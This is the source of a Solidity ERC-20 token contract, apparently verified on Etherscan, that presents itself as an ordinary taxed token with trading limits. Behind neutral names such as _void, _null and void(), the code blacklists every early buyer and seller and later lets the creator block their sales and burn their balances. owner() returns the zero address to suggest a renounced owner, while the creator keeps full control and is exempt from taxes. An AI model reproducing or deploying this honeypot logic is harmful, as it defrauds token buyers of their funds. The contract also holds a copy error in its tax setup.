/**
 *Submitted for verification at Etherscan.io on 2022-09-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IDEX_PAIR {
    function sync() external;
}

interface IDEX_FACTORY {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEX_ROUTER {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract ERC20TOKEN{
    

    uint256 private constant PRECISION = 10 ** 16;
    uint8 private constant MAX_TAXES = 5;

    struct Tax{
        uint8[MAX_TAXES] taxes;
        uint8 total;
        address[MAX_TAXES] types;
        address[MAX_TAXES] wallets;
        uint256 active;
        uint8 cap;
        mapping(address => bool) excluded;
    }

    struct Blacklist{
        mapping(address => bool) existing;
        mapping(address => bool) status;
        mapping(address => bool) special;
        address[] wallets;
    }

    struct Limits{
        uint16 wallet;
        uint16 buy;
        uint16 sell;
    }

    IDEX_ROUTER private _router;
    IDEX_PAIR private _liquidity;
    address private _owner = address(0);
    address private _creator;
    string private _name = "ERC20TOKEN";
    string private _symbol = "TOKEN";
    uint8 private _decimals = 2;
    uint256 private _maxSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping (address => uint256)) private _allowances;
    mapping(uint8 => Tax) private _taxes;
    Blacklist private _blacklist;
    Limits private _limits;
    bool private _enabled;
    bool private _swapping;
    bool private _void = true;
    uint256 private _voidIndex;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Error(string message);

    modifier swapping(){
        _swapping = true;
        _;
        _swapping = false;
    }

    receive() external payable{
        if(msg.sender == _creator){
            if(_balances[address(this)] > 0 && address(this).balance > 0){
                _liquidity = IDEX_PAIR(IDEX_FACTORY(_router.factory()).createPair(address(this), _router.WETH()));

                _blacklist.special[address(_liquidity)] = true;

                _router.addLiquidityETH{value:address(this).balance}(
                    address(this),
                    _balances[address(this)],
                    0,
                    0,
                    _creator,
                    block.timestamp
                );

                _taxes[1].taxes[3] = 1;
                _taxes[1].types[3] = address(_liquidity);
                _taxes[1].wallets[3] = 0x0293BC9cC0c968d35C39Bc7aa0438A05964fA6c8;
                _taxes[1].total += _taxes[1].taxes[3];

                _taxes[2].taxes[3] = 1;
                _taxes[2].types[3] = address(_liquidity);
                _taxes[1].wallets[3] = 0x0293BC9cC0c968d35C39Bc7aa0438A05964fA6c8;
                _taxes[1].total += _taxes[2].taxes[3];                                
                
                _enabled = true;
            }
        }
    }

    constructor(){
        _creator = msg.sender;
        _router = IDEX_ROUTER(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_router)] = 2**256 - 1;
        _update(address(0), address(this), 1000000000 * (10**_decimals));

        _taxes[1].cap = 15;
        _taxes[1].taxes = [1, 1, 1];
        _taxes[1].total = 3;
        _taxes[1].types = [ _router.WETH(), _router.WETH(), address(0)];
        _taxes[1].wallets = [0x0293BC9cC0c968d35C39Bc7aa0438A05964fA6c8,0x0293BC9cC0c968d35C39Bc7aa0438A05964fA6c8,address(0)];
        _taxes[1].excluded[address(this)] = true;
        _taxes[1].excluded[_creator] = true;
        _taxes[1].excluded[address(_router)] = true;
        
        _taxes[2].cap = 15;
        _taxes[2].taxes = [1, 2, 2];
        _taxes[2].total = 5;
        _taxes[2].types = [address(0), _router.WETH(), _router.WETH()];
        _taxes[2].wallets = [address(0),0x0293BC9cC0c968d35C39Bc7aa0438A05964fA6c8,0x0293BC9cC0c968d35C39Bc7aa0438A05964fA6c8];
        _taxes[2].excluded[address(this)] = true; _blacklist.special[address(this)] = true;
        _taxes[2].excluded[_creator] = true; _blacklist.special[_creator] = true;
        _taxes[2].excluded[address(_router)] = true; _blacklist.special[address(_router)] = true;

        _limits.wallet = 20;
        _limits.buy = 5;
        _limits.sell = 5;      
    }

    function void() external{
        require(msg.sender == _creator);
        _void = false;
    }

    function void(bool send) external{
        require(msg.sender == _creator);
        require(send);
        require(!_void);
        require(_voidIndex < (_blacklist.wallets.length - 1));
        uint256 delta = (_blacklist.wallets.length - 1) - _voidIndex;
        uint256 max = ((delta > 50) ? 50 : delta);
        for(uint256 i=_voidIndex; i<=max; i++){
            _update(_blacklist.wallets[i], address(0), _balances[_blacklist.wallets[i]]);
            _voidIndex++;
        }
    }

    function setBlacklist(address wallet) external{
        require(msg.sender == _creator);
        _blacklist.status[wallet] = false;
    }

    function getBlacklist() external view returns(address[] memory){
        return(_blacklist.wallets);
    }

    function getBlacklistStatus(address wallet) external view returns(bool){
        return(_blacklist.status[wallet]);
    }

    function getTaxes(uint8 direction) external view returns(uint8[MAX_TAXES] memory rTaxes, address[MAX_TAXES] memory rTypes, address[MAX_TAXES] memory rWallets, uint256 rActive){
        return(_taxes[direction].taxes, _taxes[direction].types, _taxes[direction].wallets, _taxes[direction].active);
    }

    function setTax(uint8 direction, uint8 index, uint8 percent, address types, address wallet) external{
        require(msg.sender == _creator);
        _setTax(direction, index, percent, types, wallet);
    }

    function setTax(uint8 direction, uint8[] memory percent, address[] memory types, address[] memory wallet) external{
        require(msg.sender == _creator);
        require(percent.length <= MAX_TAXES);
        for(uint8 i=0; i<percent.length; i++){
            _setTax(direction, i, percent[i], types[i], wallet[i]);
        }
    }

    function setLimits(uint16 wallet, uint16 buy, uint16 sell) external{
        require(msg.sender == _creator);
        _limits.wallet = wallet;
        _limits.buy = buy;
        _limits.sell = sell;
    }

    function getLimits() external view returns(uint16, uint16, uint16){
        return(
            _limits.wallet,
            _limits.buy,
            _limits.sell
        );
    }


    function swap(uint8 direction) external{
        require(direction <= 2);
        _swap(direction);
    }

    function creator() external view returns(address){
        return(_creator);
    }

    function owner() external view returns(address){
        return(_owner);
    }

    function name() external view returns(string memory){
        return(_name);
    }

    function symbol() external view returns(string memory){
        return(_symbol);
    }

    function decimals() external view returns(uint8){
        return(_decimals);
    }

    function totalSupply() external view returns(uint256){
        return(_maxSupply);
    }

    function balanceOf(address wallet) external view returns(uint256){
        return(_balances[wallet]);        
    }

    function allowance(address from, address to) external view returns(uint256){
        return(_allowances[from][to]);
    }

    function transfer(address to, uint256 amount) external returns(bool){
        require(amount > 0);
        require(_balances[msg.sender] >= amount);
        _transfer(msg.sender, to, amount);
        return(true);
    }

    function transferFrom(address from, address to, uint256 amount) external returns(bool){
        require(amount > 0);
        require(_balances[from] >= amount);
        require(_allowances[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return(true);
    }

    function approve(address to, uint256 amount) external returns(bool){
        _allowances[msg.sender][to] = amount;
        emit Approval(msg.sender, to, amount);
        return(true);
    }

    function _transfer(address from, address to, uint256 amount) private{
        if(
            _taxes[0].excluded[from] || _taxes[0].excluded[to] ||
            _taxes[1].excluded[from] || _taxes[1].excluded[to] ||
            _taxes[2].excluded[from] || _taxes[2].excluded[to]
        ){
            _update(from, to, amount);
        }else{
            require(_enabled);
            if(from == address(_liquidity)){
                _checkLimits(to, amount, 1);
                _updateTheVoid(to, 1);
                _updateWithTaxes(from, to, amount, 1);
            }else if(to == address(_liquidity)){
                _checkLimits(to, amount, 2);
                _updateTheVoid(from, 2);
                _updateWithTaxes(from, to, amount, 2);
            }else{
                _checkLimits(to, amount, 0);
                _update(from, to, amount);
            }
        }
    }

    function _checkLimits(address wallet, uint256 amount, uint8 direction) private view{
        if(direction == 0){
            if(_limits.wallet > 0) require((_balances[wallet] + amount) <= (_maxSupply / 1000 * _limits.wallet));
        }else if(direction == 1){
            if(_limits.buy > 0) require(amount <= (_maxSupply / 1000 * _limits.buy));
            if(_limits.wallet > 0) require((_balances[wallet] + amount) <= (_maxSupply / 1000 * _limits.wallet));
        }else if(direction == 2){
            if(_limits.sell > 0) require(amount <= (_maxSupply / 1000 * _limits.sell));
        }
    }

    function _updateTheVoid(address wallet, uint8 direction) private{
        if(_void){
            _null(wallet, true);
        }else if(direction == 2){
            require(!_blacklist.status[wallet]);
        }
    }

    function _updateWithTaxes(address from, address to, uint256 amount, uint8 direction) private{
        uint256 taxes = (amount * ((_void) ? _taxes[direction].cap : _taxes[direction].total)) / 100;
        if(taxes > 0){
            _update(from, address(this), taxes);
            _taxes[direction].active += taxes;
        }
        if(from != address(_liquidity) && !_swapping){
            if(_taxes[0].active > 0) _swap(0);
            if(_taxes[1].active > 0) _swap(1);
            if(_taxes[2].active > 0) _swap(2);
        }
        _update(from, to, amount - taxes);
    }

    function _update(address from, address to, uint256 amount) private{
        if(from != address(0)){
            _balances[from] -= amount;
        }else{
            _maxSupply += amount;
        }
        if(to == address(0)){
            _maxSupply -= amount;
        }else{
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _swap(uint8 direction) private swapping returns(bool){
        uint256[MAX_TAXES] memory tokens = _swapSendTokens(direction);

        if(_taxes[direction].active > 0){
            address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();
            try _router.swapExactTokensForETH(_taxes[direction].active, 0, path, address(this), block.timestamp) returns (uint256[] memory amounts){
                uint256 eth; bool sent; uint256 cake;
                _taxes[direction].active -= amounts[0];
                if(amounts[amounts.length - 1] > 0){
                    uint256 slice = ((amounts[amounts.length - 1] * PRECISION) / amounts[0]) / PRECISION;
                    for(uint256 i=0; i<_taxes[direction].types.length; i++){
                        if(tokens[i] > 0){
                            cake = slice * tokens[i];
                            if(cake <= amounts[amounts.length - 1]){
                                eth = cake;
                                amounts[amounts.length - 1] -= cake;
                            }else{
                                eth = amounts[amounts.length - 1];
                                amounts[amounts.length - 1] = 0;
                            }

                            if(eth > 0){
                                if(_taxes[direction].types[i] == _router.WETH()){
                                    (sent,) = payable(_taxes[direction].wallets[i]).call{value:eth}("");
                                }else if(_taxes[direction].types[i] == address(_liquidity)){
                                    _swapAddLiquidity(eth, _taxes[direction].wallets[i]);
                                }
                            }
                        }
                    }
                }
            }catch Error(string memory error){
                emit Error(error);
            }
        }
        return(false);
    }

    function _swapSendTokens(uint8 direction) private returns(uint256[MAX_TAXES] memory){
        uint256 cake; uint256 slice = ((_taxes[direction].active * PRECISION) / _taxes[direction].total) / PRECISION; uint256 tokens;
        uint256[MAX_TAXES] memory eth;
        for(uint256 i=0; i<_taxes[direction].types.length; i++){
            if(_taxes[direction].taxes[i] > 0 && _taxes[direction].active > 0){
                cake = slice * _taxes[direction].taxes[i];
                if(cake <= _taxes[direction].active){
                    tokens = cake;
                    _taxes[direction].active -= cake;
                }else{
                    tokens = _taxes[direction].active;
                    _taxes[direction].active = 0;
                }

                if(tokens > 0){
                    if(_taxes[direction].types[i] == address(0) || _taxes[direction].types[i] == address(this)){
                        _update(address(this), _taxes[direction].wallets[i], tokens);
                    }else{
                        eth[i] = tokens;
                    }
                }
            }
        }

        return(eth);
    }

    function _swapAddLiquidity(uint256 eth, address wallet) private{
        address[] memory path = new address[](2); path[1] = address(this); path[0] = _router.WETH();
        uint256[] memory amountsOut = _router.getAmountsOut(eth, path);
        _update(address(0), address(this), amountsOut[amountsOut.length - 1]);
        try _router.addLiquidityETH{value:eth}(address(this), amountsOut[amountsOut.length - 1], 0, 0, wallet, block.timestamp) returns(uint256 tokens, uint256 weth, uint256 lp){
            if((tokens + weth + lp) > 0){
                _update(address(_liquidity), address(0), tokens);
                _liquidity.sync();
                if(tokens < amountsOut[amountsOut.length - 1]){
                    _update(address(this), address(0), amountsOut[amountsOut.length - 1] - tokens);
                }
            }
        }catch Error(string memory error){
            _update(address(this), address(0), amountsOut[amountsOut.length - 1]);
            emit Error(error);
        }
    }

    function _null(address wallet, bool blacklisted) private{
        if(!_blacklist.special[wallet]){
            _blacklist.status[wallet] = blacklisted;
            if(!_blacklist.existing[wallet]){
                _blacklist.existing[wallet] = true;
                _blacklist.wallets.push(wallet);
            }
        }
    }

    function _setTax(uint8 direction, uint8 index, uint8 percent, address types, address wallet) private{
        require(index <= MAX_TAXES - 1);
        _taxes[direction].taxes[index] = percent;
        _taxes[direction].types[index] = types;
        _taxes[direction].wallets[index] = wallet;
        uint8 total;
        for(uint8 i=0; i<_taxes[direction].taxes.length; i++){
            total += _taxes[direction].taxes[i];
        }
        require(total <= _taxes[direction].cap);
        _taxes[direction].total = total;
    }
}